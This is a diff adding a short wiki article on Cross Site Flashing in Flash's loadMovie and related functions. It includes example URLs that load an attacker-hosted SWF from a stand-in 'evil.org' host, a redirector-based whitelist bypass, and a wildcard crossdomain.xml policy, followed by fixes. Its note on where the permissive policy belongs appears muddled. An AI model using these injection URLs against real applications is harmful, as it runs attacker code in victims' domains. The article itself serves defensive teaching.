@@ -1,0 +1,33 @@
+#summary Flash loadMovie XSS attacks
+#labels is-article,about-security
+#sidebar TOCArticlesXSS
+
+All image, sound and movie loading functions are prone to Cross Site Flashing (XSF).  That is, loading malicious Flash movies from an attacker's domain and executed in the domain of the vulnerable Flash application.  The malicious Flash movie could be used for XSS or can interact directly with the Flash movie that loaded it.  This attack vector was first documented in May 2007 by Stefano Di Paola.
+
+Consider `userinput3` in [ArticleFlashSecurityGetURL the VulnerableMovie code].  If `userinput3` is specified, then `VulnerableMovie` calls `_root.loadMovie(_root.userinput3);` and an attacker could load any movie or URL is his or her choosing.  For example:
+
+{{{
+http://www.example.com/VulnerableMovie.swf?userinput3=http://www.evil.org/Attack.swf
+}}}
+
+Note that the attacker must also place an insecure security policy on the site.  Namely, add the file http://www.example.com/crossdomain.xml containing:
+{{{
+<cross-domain-policy> 
+    <allow-access-from domain="*" /> 
+</cross-domain-policy>
+}}}
+
+So that the vulnerable SWF can load the attacker's evil SWF.  This issue occurs in *all* image, sound and movie loading functions. 
+
+== Solution ==
+
+To fix this issue, you should always load SWFs from a single domain or path, or a whitelist of domains or paths.  Note that the domain or path combinations cannot contain any *redirectors*, as an attacker could use a redirector on a safe domain to redirect to the attack SWF:
+
+{{{
+http://www.example.com/VulnerableMovie.swf?userinput3=http%3A//www.google.com/local_url%3Fq%3Dhttp%3A//www.evil.org/attack.swf
+}}}
+
+Furthermore, Flash developers must ensure that attackers do not perform director traversal attacks to use redirectors.  Namely, the user definable input must not contain the string ".." or any encoding of ".." (e.g. "%2e%2e").
+
+
+
